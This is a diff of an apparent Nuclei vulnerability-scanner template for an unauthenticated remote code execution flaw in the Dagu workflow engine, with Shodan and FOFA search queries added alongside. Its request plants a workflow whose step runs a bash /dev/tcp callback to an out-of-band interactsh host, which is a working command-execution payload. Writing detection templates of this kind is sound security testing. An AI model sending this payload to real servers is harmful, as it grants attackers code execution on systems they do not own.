@@ -1,5 +1,4 @@
 id: dagu-rce
-
 info:
   name: Dagu Workflow Engine - Remote Code Execution
   author: omarkurt
@@ -16,18 +15,16 @@ info:
     cvss-score: 9.8
     cwe-id: CWE-306
   metadata:
-    runzero-review: REJECT/2026-03-03/uses interactsh
-    verified: true
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Dagu"})
+    fofa-query: 'title="Dagu"'
     max-request: 1
-    vendor: dagu-org
     product: dagu
     shodan-query: 'title:"Dagu"'
-    fofa-query: 'title="Dagu"'
+    vendor: dagu-org
+    verified: true
   tags: dagu,rce,oob,unauth,vuln
-
 variables:
   dag_name: "{{rand_text_alphanumeric(8)}}"
-
 http:
   - raw:
       - |
@@ -36,7 +33,6 @@ http:
         Content-Type: application/json
 
         {"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}
-
     matchers:
       - type: dsl
         dsl:
@@ -45,4 +41,3 @@ http:
           - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
           - 'status_code == 200'
         condition: and
-
